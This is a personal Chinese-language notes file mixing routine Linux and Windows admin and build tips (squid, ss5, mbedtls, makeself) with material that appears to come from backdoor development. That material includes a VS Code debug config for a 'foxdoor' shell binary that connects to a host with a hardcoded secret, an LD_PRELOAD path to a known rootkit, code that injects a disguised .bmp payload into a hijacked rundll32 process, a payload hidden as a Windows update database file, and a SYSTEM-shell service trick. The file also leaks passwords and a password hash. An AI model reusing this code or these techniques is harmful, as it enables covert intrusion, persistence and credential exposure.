## squid

	* 配置路径
		服务名：squid
		主程序：/usr/sbin/squid
		配置目录：/etc/squid
		主配置文件：/etc/squid/squid.conf
		监听tcp端口号：3128
		默认访问日志文件：/var/log/squid/access.log
	* 常见命令：
		修改配置：/etc/squid/suqid.conf
		重启squid: systemctl restart squid
		查看日志: tail -f /var/log/squid/access.log
		启动：service squid start   #最安全做法
		启动：/usr/sbin/squid -s  #后台启动,有可能不生效
		停止：squid -k shutdown
		重启配置：systemctl reload squid
	* 工作流程：
		* 1 客户端与代理建立TCP连接（三次握手）
		* 2 客户端给服务端发送请求；
		* 3 代理劫持客户端的请求，重新解析数据包，转发给服务器
		* 4 服务端响应代理的请求，发送响应给代理
		* 5 代理转发给客户端


```
test:$apr1$RX.eQNcm$ya0Kobxcc3eY8IGAKyE.v1

#http_access allow all
#http_access deny all
#test:123
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
acl auth_user proxy_auth REQUIRED
http_access allow auth_user
```



### 修改IP

```
vi /etc/sysconfig/network-scripts/ifcfg-eth0  修改ip 
GATEWAY=
vi /etc/resolv.conf  修改DNS
/etc/init.d/network restart  重启网卡
```

## sock5

```
* 安装编译环境和依赖
	* yum install gcc openldap-devel pam-devel openssl-devel -y
	* wget http://jaist.dl.sourceforge.net/project/ss5/ss5/3.8.9-8/ss5-3.8.9-8.tar.gz
	* tar xf ss5-3.8.9-8.tar.gz
	* cd ss5-3.8.9
	* ./configure 
make && make install
cd /etc/opt/ss5/

* 修改/etc/opt/ss5/ss5.passwd，一行写一个用户名和密码，中间空格分开，比如:
	* username1 pwd1
	* username2 pwd2

* 修改/etc/sysconfig/ss5，取消#SS5_OPTS=” -u root”的注释，并修改为
	SS5_OPTS=" -u root -b 0.0.0.0:1080"
* 其中1080是指定的端口号，可以使用其它端口（这步不设置的话默认使用1080端口）

* 增加执行权限
	chmod +x /etc/init.d/ss5

* 在chkconfig工具服务列表中增加此服务，设置开机自启（可选）
	chkconfig --add ss5
	chkconfig ss5 on

* 手动启动
	service ss5 start

* 默认端口1080,开防火墙
	/usr/sbin/iptables -I INPUT -p tcp --dport 1080 -j ACCEPT

* 每次重启计算机后或者出现以下错误时：
	Can’t create pid file /var/run/ss5/ss5.pid
	Can’t unlink pid file /var/run/ss5/ss5.pid
* 需要先创建 /var/run/ss5 目录，然后再启动 ss5
	echo 'mkdir /var/run/ss5/' >> /etc/rc.d/rc.local ;\
	chmod +x /etc/rc.d/rc.local ;\
	/sbin/chkconfig ss5 on
* 添加用户认证：vi /etc/opt/ss5/ss5.conf
	* 1	 默认的是：无用户认证。 
		auth 0.0.0.0/0
    * 2	如果想要使用用户认证，需要将上面两行修改成下面这样：
	    auth 0.0.0.0/0 - u
    	permit u 0.0.0.0/0 - 0.0.0.0/0 - - - - -
    * 3	添加用户名及密码 
	    * vi /etc/opt/ss5/ss5.passwd
	    * 添加用户密码 每行一个用户+密码（之间用空格）
		    test1 12345
		    test2 56789
```

### openSSL编译和使用

		* 下载openssl源代码
		* 网站：https://www.openssl.org/source/old/
		* 解压，进入openssl目录
		* ./config -fPIC no-shared
		* 其中，-fPIC：指示生成位置无关的代码，这个选项是在把openssl生成的静态库链接到动态库的时候提示错误添加的；no-shared：指示生成静态库。
		* 动态库 ./config -fPIC shared
		* make
		* 完成静态编译
		*  最终在当前目录下会编译出libssl.a和libcrypto.a两个库文件
		*  将include/openssl目录拷贝到自己模块的头文件目录（./inc）下，将libssl.a和libcrypto.a静态库拷贝到自己模块的库文件目录（./lib）下，在makefile中添加头文件目录和lib库：
	  INCLUDE += ******** -I./inc
	  LIB += ******* -L./lib -lssl -lcrypto
linux 查询程序依赖

	* objdump -p shell
	* ldd shell
	* readelf -s shell 
冰点 5f6Dq2YB

### Vscode root权限调试

```
root.sh 内容 pkexec /usr/bin/gdb "$@"

-----------------------------------------------------------------------------------------------------
launch.json 内容
{
    "version": "0.2.0",
    "configurations": [
     {
        "name": "shell",
        "type": "cppdbg",
        "request": "launch",
        "program": "/home/yu/work/foxdoor-base/userland/output/shell",
        "args": [
            "-t", "192.168.182.128", "-s", "s3cr3t", "-p", "443", "-r", "1",

        ],
        "stopAtEntry": false,
        "cwd": "/home/yu/work/foxdoor-base/userland/output",
        "environment": [],
        "externalConsole": false,
        "MIMode": "gdb",
        "miDebuggerPath": "/home/yu/work/foxdoor-base/root.sh", //root状态调试
        "setupCommands": [
            {
                "description": "为 gdb 启用整齐打印",
                "text": "-enable-pretty-printing",
                "ignoreFailures": true
            },
            {
                "description":  "将反汇编风格设置为 Intel",
                "text": "-gdb-set disassembly-flavor intel",
                "ignoreFailures": true
            }
        ],
        "preLaunchTask": "build"
     }
    ]
}

-----------------------------------------------------------------------------------------------------
tasks.json   内容
{
	"version": "2.0.0",
	"tasks": [
		{
			"type": "cppbuild",
			"label": "build",
			"command": "make",
			"args": [
				"${fileBasenameNoExtension}"
			],
			"options": {
				"cwd": "/home/yu/work/foxdoor-base/userland"
			},
			"problemMatcher": [
				"$gcc"
			],
            "group": {
                "kind": "build",
                "isDefault": true
            },
			"detail": "调试器生成的任务。"
		}
	]
}

优化调试：-O0
```

### makeself

```
# 下载工具
wget https://github.com/megastep/makeself/releases/download/release-2.4.2/makeself-2.4.2.run

# 解压安装
bash makeself-2.4.2.run; cd makeself-2.4.2
sudo cp makeself.sh /usr/bin/makeself

#打包
makeself.sh [args] archive_dir file_name label startup_script [script_args]
运行脚本  [可选参数] 目标sh所在目录  打包完可执行文件名  sh文件（相对于archive_dir的路径） sh可选参数

eg：
sh makeself.sh bot bot_output "- " ./install.sh
```



- **[1] makeself 打包命令可选参数**

| 参数                        | 参数使用说明                                                 |
| :-------------------------- | :----------------------------------------------------------- |
| **`--version`**             | 打印版本号                                                   |
| **`--needroot`**            | 需要`root`用户才可以执行                                     |
| **`--gzip`**                | 默认使用`gzip`工具进行压缩                                   |
| **`--pigz`**                | `gzip`的多线程解决方案                                       |
| **`--bzip2`**               | 使用`bzip2`代替`gzip`进行更好的压缩                          |
| **`--pbzip2`**              | `bzip2`的多线程解决方案                                      |
| **`--xz`**                  | 使用`xz`代替`gzip`进行更好的压缩(远程支持多线程压缩)         |
| **`--zstd`**                | 使用`zstd`代替`gzip`进行更好的压缩                           |
| **`--threads thds`**        | 限制支持多线程解压缩工具所使用的线程数量                     |
| **`--base64`**              | 用`Base64`格式将存档编码为`ASCII`格式而不进行压缩            |
| **`--gpg-encrypt`**         | 使用`gpg -ac -z $COMPRESS_LEVEL`加密归档文件，需要输入密码   |
| **`--ssl-encrypt`**         | 使用`openssl aes-256-cbc -a -salt`加密归档文件，需要输入密码 |
| **`--ssl-passwd pass`**     | 设置`openssl`加密归档文件需要输入的密码                      |
| **`--compress`**            | 使用`UNIX系统的`compress`命令压缩数据(在没有 gzip 时默认)    |
| **`--nocomp`**              | 不对存档文件进行压缩，默认是一个`tar`包                      |
| **`--complevel lvl`**       | 指定压缩级别，默认使用`9`级别                                |
| **`--notemp`**              | 生成的归档文件不会将文件解压缩到临时目录，而解压到当前目录的创建的新目录中 |
| **`--current`**             | 文件将被提取到当前目录，而不是子目录中(同`--notemp`一样，但会提取没有文件夹) |
| **`--follow`**              | 存储指向的文件而不是链接本身                                 |
| **`--append file`**         | 将数据追加到现有存档中，而不是创建新文件                     |
| **`--header file`**         | 使用指定的脚本来代替默认的`makeself-header.sh`文件(默认与`makeself`文件同级) |
| **`--cleanup file`**        | 指定在执行中断或成功完成时运行的脚本                         |
| **`--nomd5/--nocrc`**       | 禁止检查存档文件的`MD5`或`CRC`校验和                         |
| **`--tar-extra opt`**       | 在`tar`命令行中附加更多选项                                  |
| **`--keep-umask`**          | 保持`umask`设置为`shell`默认值，而不是在执行自解压缩存档时覆盖 |
| **`--packaging-date date`** | 使用提供的字符串作为打包日期而不是当前日期                   |
| **`--license`**             | 附加许可证文件                                               |
| **`--nooverwrite`**         | 如果指定的目标目录已经存在则不要解压缩存档                   |
| **`--header file`**         | 指定头部信息脚本文件的位置，默认为`makeself-header.sh`文件   |
| **`--help-header file`**    | 在存档的`--help`输出中添加标题                               |
| **`--export-conf`**         | 将配置变量导出到`startup_script`脚本中                       |

- **[2] ARGS - 需要注意的选项**

| 选项                 | 说明                                         |
| :------------------- | :------------------------------------------- |
| **`archive_dir`**    | 包含要归档的文件的目录的名称                 |
| **`file_name`**      | 要创建的存档名称                             |
| **`label`**          | 描述存档包的任意描述并在解压的时候显示       |
| **`startup_script`** | 解压后要执行的脚本，需指定`./`在当前目录执行 |
| **`[script_args]`**  | `startup_script`脚本的附加参数               |

- **[3] ARGS - 解包的可选参数**

| 参数                   | 参数使用说明                                                 |
| :--------------------- | :----------------------------------------------------------- |
| **`--keep`**           | 文件将被提取到当前工作目录中并将一直保留到您删除它们为止     |
| **`--verbose`**        | 在执行嵌入式脚本之前将提示用户                               |
| **`--target dir`**     | 允许在任意指定目录解压`run`包                                |
| **`--confirm`**        | 在执行嵌入式脚本之前将提示用户是否需要执行                   |
| **`--info`**           | 打印出有关`run`包的常规信息                                  |
| **`--list`**           | 列出档案中的文件                                             |
| **`--check`**          | 校验和检查归档文件的完整性                                   |
| **`--nochown`**        | 默认情况下提取后在目标目录上运行`chown -R`命令以便所有文件都属于当前用户 |
| **`--tar`**            | 使用以下参数作为`tar`命令的参数                              |
| **`--noexec`**         | 提取后不要运行嵌入式脚本                                     |
| **`--nodiskspace`**    | 在提取之前不检查可用的磁盘空间                               |
| **`--noexec-cleanup`** | 在提取之前不支持指定的删除脚本                               |

### 利用管道文件实现不同进程通信

```
send.c
	#define FIFO_STOC "./fifo_StoC"
    if (access(FIFO_CTOS, F_OK) == -1) {
        res = mkfifo(FIFO_CTOS, 0777);
        if (res != 0) {
            fprintf(stderr, "Could not create fifo %s\n", FIFO_CTOS);
            exit(EXIT_FAILURE);
        }
    }
    
    res = write(pipe_fd_StoC, message, strlen(message));
    if (res == -1) {
        fprintf(stderr, "Write error on pipe\n");
        exit(EXIT_FAILURE);
    }
recv.c
	#define FIFO_STOC "./fifo_StoC"
	int pipe_fd_StoC = open(FIFO_STOC, O_RDONLY);
	res = read(pipe_fd_StoC, buffer, BUFFER_SIZE);
```

### realloc 函数

if ((buffer = realloc(buffer, res_len + len)) == NULL))

如果buffer内存大小比res_len + len 大  则不重新分配

否则复制原本的到新的内存，申请新的内存。

### wolfssl 编译

```
./configure --prefix=$(pwd)/output --enable-static=yes --enable-aesgcm=yes
```

缺少.so

 libmbedtls.so.19: cannot open shared object file: No such file or directory

```
echo "/usr/local/lib" >> /etc/ld.so.conf
root@ubuntu:/home/yu/work# ldconfig

```

编译Mbedtls

```
cmake -DUSE_SHARED_MBEDTLS_LIBRARY=TRUE .
make
make install
```

mbedtls 连接服务器

```
// 需要的库 -lmbedtls -lmbedx509 -lmbedcrypto
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/error.h>

int Proxy_Https_Connect(int *fd, PROXY *myProxy, char * DstIP, unsigned short DstPort)
{
	char buff[2048];
    mbedtls_ssl_config conf;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;

    const char *pers = "ssl_client1";
    int ret;

    /* Initialize entropy and CTR_DRBG contexts */
    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    if ((ret = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func, &entropy, (const unsigned char *)pers, strlen(pers))) != 0) {
        // printf("mbedtls_ctr_drbg_seed returned %d\n", ret);
        return -1;
    }

    /* Initialize SSL context and configure it */
    mbedtls_ssl_init(&ssl);
    mbedtls_ssl_config_init(&conf);

    if ((ret = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT)) != 0) {
        // printf("mbedtls_ssl_config_defaults returned %d\n", ret);
        return -1;
    }

    mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &ctr_drbg);
    mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_NONE);
    /* Initialize network connection and set server address */
	close(*fd);  //zys 20230207
    mbedtls_net_init(fd);

	char port[10];
    sprintf(port,"%d",myProxy->pro_port);
    if ((ret = mbedtls_net_connect(fd, myProxy->pro_ip, port, MBEDTLS_NET_PROTO_TCP)) != 0) {
        // printf("mbedtls_net_connect returned %d\n", ret);
        return -1;
    }

	ret = set_keep_timeout(fd);  //zys 20230207
	if (ret < 0) {
		return -1;
	}

    /* Set SSL context's connection and configure it */
    mbedtls_ssl_set_bio(&ssl, fd, mbedtls_net_send, mbedtls_net_recv, NULL);

    if ((ret = mbedtls_ssl_setup(&ssl, &conf)) != 0) {
        // printf("mbedtls_ssl_setup returned %d\n", ret);
        return -1;
    }

    /* Perform SSL/TLS handshake */
    if ((ret = mbedtls_ssl_handshake(&ssl)) != 0) {
        // printf("mbedtls_ssl_handshake returned %d\n", ret);
        return -1;
    }

    char header[512] = {0};
    char temp[128] = {0};
    sprintf(header, "CONNECT %s:%d HTTP/1.1\r\n",DstIP, DstPort);
    strcat(header, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\r\n"); // need modify?
    strcat(header, "Pragma: no-cache\r\nProxy-Connection: keep-alive\r\nConnection: keep-alive\r\n");
    sprintf(temp, "Host: %s\r\n", DstIP);
    strcat(header, temp);
    memset(temp, 0, sizeof(temp));
    strcat(header, "\r\n");

	// if(strlen((char *)myProxy->username)>0)
	// {
	// 	char szAuth[64] ={0};
	// 	sprintf(szAuth, "%s:%s", (char *)myProxy->username, (char *)myProxy->password);
	// 	strcat(header, "Proxy-Authorization: Basic ");
	// 	base64_encode(szAuth, strlen(szAuth), buff);
	// 	strcat(header, buff);
	// 	strcat(header, "\r\n");	
	// }
    
	/* Send HTTP GET request to server */
    if ((ret = mbedtls_ssl_write(&ssl, (const unsigned char *)header, strlen(header))) <= 0) {
        printf("mbedtls_ssl_write returned %d\n", ret);
        return -1;
    }

/* Read and print response from server */
    char response[4096] = {0};
    ret = mbedtls_ssl_read(&ssl, (unsigned char *)response, BUFSIZE);
	if(ret < 0 ){
		return -1;
	}
	// *fd = server_fd.fd;
	return 1;

}
```



### 搭建putty

![putty-session](../\images\putty-session.png)



![putty-session](../\images\putty-session.png)



将yu机器接收到的4444端口 转发到192.168.8.130：443 端口



### 版本号

```
Linux localhost 3.2.0-67-generic #101-Ubuntu SMP Tue Jul 15 17:46:11 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```
第一个组数字：3,主版本号
第二个组数字：2,次版本号，当前为稳定版本
第三个组数字：0,修订版本号
第四个组数字：67，当前内核版本（3.2.0）的第67次微调patch
generic：当前内核版本为通用版本，另有表示不同含义的server（针对服务器）、i386（针对老式英特尔处理器）
pae（PhysicalAddressExtension）：物理地址扩展，为了弥补32位地址在PC服务器应用上的不足而推出，表示此32位系统可以支持超过4G的内存
x86_64：采用的是64位的CPU
SMP：对称多处理机，表示内核支持多核、多处理器
TueJul1517:46:11UTC2014：内核的编译时间（builddate）为2014/07/1517:46:11
```

### linux扩容

```
先用指令 df -h 查看磁盘情况。
vgdisplay
```

![Snipaste_2023-01-09_17-07-01](E:../\images\Snipaste_2023-01-09_17-07-01.png)

```
lvextend -L +1G /dev/mapper/ubuntu 表示加1G到/dev/mapper/ubuntu
lvextend -L 100G /dev/mapper/ubuntu 表示扩大到100G /dev/mapper/ubuntu
resize2fs /dev/mapper/ubuntu 使用resize2fs指令来增大或者收缩未加载的“ext2/ext3”文件系统的大小
```

###  ubuntu 加入环境变量

```
export PATH=/home/fuller/Qt5.9.0/Tools/QtCreator/bin:$PATH
```



```
./shell -t 192.168.8.130 -p 443 -s s3cr3t -r 1
```

更新镜像源

```
cat > /etc/apt/sources.list <<EOF
deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse

EOF
```

### 获取系统代理信息

```
gsettings get org.gnome.system.proxy mode //返回代理模式
gsettings list-recursively org.gnome.system.proxy  //返回具体代理信息
```

### 查看本机的出口公网IP信息：

```
curl ifconfig.me
or
curl cip.cc
```

### 修改ubuntu 按键冲突

```
1、查看系统组合键占用情况
Ctrl+Alt+Up/Down一般是被“切换工作空间”功能占用，我们通过命令分别查看一下。

    a、查看switch-to-workspace-up
    gsettings get org.gnome.desktop.wm.keybindings switch-to-workspace-up
    返回：
    ['<Super>Page_Up', '<Control><Alt>Up']
    
    b、查看switch-to-workspace-down
    gsettings get org.gnome.desktop.wm.keybindings switch-to-workspace-down
    返回：
    ['<Super>Page_Up', '<Control><Alt>Down']
    
2、解除系统组合键占用
    可以看到，有两组快捷键，我们保留前面的那一组。
    gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-up "['<Super>Page_Up']"
    gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-down "['<Super>Page_Down']"
3、复位
    下面的命令是对所有组合键绑定进行复位：

    gsettings reset org.gnome.desktop.wm.keybindings
    这样做未免矫枉过正，建议还是使用以下命令，只把切换工作空间的组合键恢复过来：

    gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-up "['<Super>Page_Up', '<Control><Alt>Up']"
    gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-down "['<Super>Page_Down', '<Control><Alt>Down']"
    
    罗列所以快捷键
    gsettings list-keys  org.gnome.desktop.wm.keybindings 
```

### 编译动态库.so

```
gcc test.c  -fPIC -shared -o libtest.so

gcc 依赖库文件 -fPIC -shared -o libxxx.so

libxxx.so 必须以 lib 开头 .so结尾

-fPIC       作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，
  则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意
  位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。

-shared     目的是使源码编译成动态库 .so 文件


void __attribute__ ((constructor)) my_library_init();
void my_library_init() {
    // your initialization code here
    // ...
    // call the main function
    my_library_main(0, NULL);
}
```

### 利用动态库优先级，实现函数替换，hook技术

```
// hook.cpp
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// hock 函数
int rand (void)
{
    printf("hock function \n");
    return 100;   // 返回一个固定值
}
//只能hook外部调用的函数，动态库里面的函数
```

### dump_stack()  和   Ftrace 列出调用栈

```
列出调用栈  内核调试
```

### gdb 设置环境变量

```
set environment LD_PRELOAD /home/yu/work/jynxkit/ld_poison.so
```

### int 转16进制  

```C
	//2个字节 转int
	unsigted char buffer[2] = {0x00,0x10}
    int data_count = ((buffer[0] << 8) + buffer[1]; //data_count = 16
	//int 转16进制  用2个字节
	buffer[0] = (data_count >> 8) & 0xFF;
	buffer[1] = (data_count)&0xFF;
```

### 应用层读写注册表

```C
#include <Windows.h>
#include <iostream>

void getValue(_In_ HKEY hKey, _In_opt_ LPCWSTR keyName) {
    DWORD type, size;
    LONG result = RegQueryValueExW(hKey, keyName, nullptr, &type, nullptr, &size);
    if (result != ERROR_SUCCESS)
    {
        std::cerr << "Failed to get registry value size: " << result << '\n';
        return ;
    }
    std::wstring value(size / sizeof(wchar_t), L'\0');
    result = RegQueryValueExW(hKey, keyName, nullptr, &type, (LPBYTE)&value[0], &size);
    if (result != ERROR_SUCCESS)
    {
        std::cerr << "Failed to get registry value: " << result << std::endl;
        return ;
    }

    std::wcout << keyName << " :" << value << std::endl;
}

void WriteRegist(DWORD KeyControl, DWORD NetControl, DWORD ErrControl)
{

    HKEY hKey;
    DWORD dwType = REG_DWORD;
    DWORD dwSize = sizeof(ErrControl);

    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\services\\rtwlane", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        
        if (RegSetValueEx(hKey, L"KeyControl", 0, dwType, (LPBYTE)&KeyControl, dwSize) == ERROR_SUCCESS)
        {
            printf("Successfully wrote to registry.\n");
        }
        if (RegSetValueEx(hKey, L"NetControl", 0, dwType, (LPBYTE)&NetControl, dwSize) == ERROR_SUCCESS)
        {
            printf("Successfully wrote to registry.\n");
        }
        if (RegSetValueEx(hKey, L"ErrControl", 0, dwType, (LPBYTE)&ErrControl, dwSize) == ERROR_SUCCESS)
        {
            printf("Successfully wrote to registry.\n");
        }

        RegCloseKey(hKey);
    }
    else
    {
        printf("Failed to open registry key.\n");
    }
}

int main()
{

    //WriteRegist(80, 20, 10);

    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS)
    {
        std::cerr << "Failed to open registry key: " << result << '\n';
        return 1;
    }

    getValue(hKey, L"BIOSVendor");
    getValue(hKey, L"BIOSVersion");
    getValue(hKey, L"BaseBoardManufacturer");
    getValue(hKey, L"BaseBoardVersion");
    getValue(hKey, L"BIOSReleaseDate");
    getValue(hKey, L"SystemFamily");
    getValue(hKey, L"SystemProductName");
    getValue(hKey, L"SystemSKU");
    getValue(hKey, L"SystemVersion");
    system("pause");
    RegCloseKey(hKey);
    return 0;
}
```

### 把文件内容转化为16进制 ，写入头文件

```python
#!/usr/bin/env python
# WinKexec: kexec for Windows
# Copyright (C) 2008-2009 John Stumpo
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys
import time

def usage():
  sys.stderr.write('''usage: %s [bin_file] [h_file] [array_name]

Converts a binary file to an unsigned char array in a C header file.
''' % sys.argv[0])
  sys.exit(1)

if len(sys.argv) != 4:
  usage()

bin_file = open(sys.argv[1], 'rb').read()

h_file = open(sys.argv[2], 'w')
h_file.write('''/* This file is generated by a script.
 * DO NOT EDIT THIS FILE!
 *
 * Created by %s from %s.
 * %s
 */

#define %s_SIZE %d
static const unsigned char %s[] = {''' %
  (sys.argv[0], sys.argv[1], time.asctime(),
   sys.argv[3].upper(), len(bin_file), sys.argv[3]))

for i in range(0, len(bin_file)):
  if i % 8 == 0:
    h_file.write('\n  /* 0x%08x */  0x%02x,' % (i, bin_file[i]))
  else:
    h_file.write(' 0x%02x,' % bin_file[i])

h_file.write('\n};\n')
h_file.close()

//示例： python bin2h.py test.exe test.h TEST
```

### 文件16进制头文件 写入文件

```C
	wchar_t ExePlace[1024];
	GetModuleFileName(0,ExePlace,1024);
	wstring ws(ExePlace);
	string path(ws.begin(), ws.end());//获取当前路径。
	path = path.substr(0, path.find_last_of('\\'));
	path.append("\\insDrv.exe");//保存文件名。

	FILE* fp = nullptr;
	fopen_s(&fp, path.c_str(), "wb");
	if (fp == nullptr) {
		printf("[-] error sys file\r\n");
		return 0;
	}

	fwrite(TEST, 1, TEST_SIZE, fp);
	fclose(fp);
    std::cout << "[+]insDrv.exe Export Success!\n";
	system("pause");
```

### Winrar打包成exe

```
WinRAR.exe a 111.exe  ../Test/*.*
rar.exe c -znote.txt 111.exe
```

### 如果出现error: ‘NULL’ undeclared (first use in this function)

```
添加 <stddef.h> 头文件
```

### 查看硬盘序列号

```
wmic diskdrive get Model,name,serialnumber
```

### 出现不同编译器不同的编译器版本创建的；请使用相同的编译器重新生成所有对象和库的问题

```
属性 C++ 优化 全程序优化关闭。
如果多个lib  全部用”全程序优化关闭“ 编译
```

### wchar_t to char

```
ret = wcstombs(char *, (wchar_t*), NameSize);
```

### windows程序鼠标点击，控制台取消暂停

```
    HANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);
    DWORD prevMode;

    // 获取控制台输入模式
    GetConsoleMode(hInput, &prevMode);
    // 禁用Quick Edit模式
    SetConsoleMode(hInput, prevMode & ~(ENABLE_QUICK_EDIT_MODE));
```

### 查看分析进程的堆栈

```
打开任务管理器，详细信息，创建转储文件，用wingdb打开。
找到入口函数地址，用ida加载进程文件，找到入口函数，设置基址。根据wingdb堆栈地址，找到对应的函数。
补4个0 ？
```

<img src="..\images\Snipaste_2023-10-31_21-44-03.png" alt="Snipaste_2023-10-31_21-44-03" style="zoom: 67%;" />

![Snipaste_2023-10-31_21-56-10](..\images\Snipaste_2023-10-31_21-56-10.png)

### 进入system用户

```
以管理员权限运行cmd，运行 “sc Create SuperCMD binPath= "cmd /K start" type= own type= interact”
在cmd中运行“net start SuperCMD”命令启动服务。
点击查看消息。
```

Hell0VPN

123abc.com

PsExec -i -s -d 

%allusersprofile%Windows\SoftwareDistribution\ReportingEvents.db

### freebsd 开启ssh

```
1、开启sshd服务:

vi /etc/inetd.conf

ssh stream top    nowait root     /usr/sbin/sshd
ssh stream tcp6   nowait root    /usr/sbiin/sshd

去掉ssh前的#，保存退出

2、让root能够远程登录，系统默认禁止root远程登录，学习无关紧要，直接放行

#vi /etc/ssh/sshd_config

找到：#PermitRootLogin no

改成：PermitRootLogin yes   注意去#

3、重起sshd

#/etc/rc.d/sshd/restart
```

### freebsd8.4 官方库地址

```
方式一：用pkg_add 安装库
网站下载库：http://ftp-archive.freebsd.org/pub/FreeBSD-Archive/old-releases/amd64/8.4-RELEASE/packages/
pkg_add 下载的名字。安装

方式二：pkg install 

解决libuv preathonce 死锁的问题。不用静态编译。

```

### strcat 需要strcat_s

```
属性->C++->预处理  添加 _CRT_SECURE_NO_WARNINGS
```

'GetVersionExW': 被声明为已否决

```
属性->C++->常规  sdl改为否
```

### ssh 连接出错

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ECDSA key sent by the remote host is
SHA256:ZGuhibpiarIP9sjPzIODOIprE+JqC/3qetUVatvKH2o.

ssh-keygen -R 192.168.8.134
```

### 7z 加密压缩命令

```
7z a package-p.7z I://* -r -mx=9 -p1qazZAQ! -mhe=on
7z a package-p.7z .\lib\* -r -mx=9 -p123 -mhe=on
!QAZzaq1
```

### 生成密钥对

```
openssl genrsa -out rsa_private_key.pem 2048
	 openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM -nocrypt > rsa_private_key_pkcs8.pem
openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key_2048.pub
```

win7 Process Monitor提示无法加载驱动

```
安装这个补丁
https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148
```

### mbedtls 错误打印输出

```
			char error_buf[100]; // 用于存储错误描述的缓冲区
			mbedtls_strerror(n, error_buf, sizeof(error_buf));
			p_debug("Error description: %s\n", error_buf);
```

### mbedtls debug输出

```
void my_debug_function(void *ctx, int level, const char *file, int line, const char *str)
{
	p_debug("%s", str);
}

mbedtls_ssl_conf_dbg(&conf, my_debug_function, NULL);
mbedtls_debug_set_threshold(4);
	
```



```
    	char test[5] ={0x00,0x00,0x00,0xAE,0x00};
		pel_send_msg(client,test, 5);
		char test2[128] = {0x00,0x00,0x00,0x00};
		memcpy(test2 + 4, &host_info, sizeof(host_basic_info));
		pel_send_msg(client,test2, sizeof(host_basic_info) + 4);
```

E387

D9A4

B01B

```
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("cloudmusic.bmp", "rb");

	fseek(fp, 0, SEEK_END);

	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	buffer = (unsigned char*)malloc(size);
	fread(buffer, size, 1, fp);

	char* v7A = (char*)VirtualAlloc(0, size, 0x3000u, 0x40u);
	memcpy((void*)v7A, buffer, size);

	struct _PROCESS_INFORMATION ProcessInformation;
	struct _STARTUPINFOA StartupInfo;
	void* v24;
	CONTEXT Context;
	DWORD DwWrite = 0;
	memset(&StartupInfo, 0, sizeof(StartupInfo));
	StartupInfo.cb = 68;
	BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
	if (result)
	{
		Context.ContextFlags = 65539;
		GetThreadContext(ProcessInformation.hThread, &Context);
		v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, size, 0x1000u, 0x40u);
		WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, (SIZE_T*)&DwWrite);
		Context.Eip = (DWORD)v24;
		SetThreadContext(ProcessInformation.hThread, &Context);
		ResumeThread(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hThread);
		result = CloseHandle(ProcessInformation.hProcess);
	}
```

触发异常

```
		int* pValue = NULL;
		printf("into Try.\n");
		*pValue = 0x114514;
```

centos7-6  957

centos7-9  1160



```
	char tmp[128]{ 0 };//"cmd /c rundll32 %ALLUSERSPROFILE%\\Windows\\SoftwareDistribution\\ReportingEvents.db Entery"
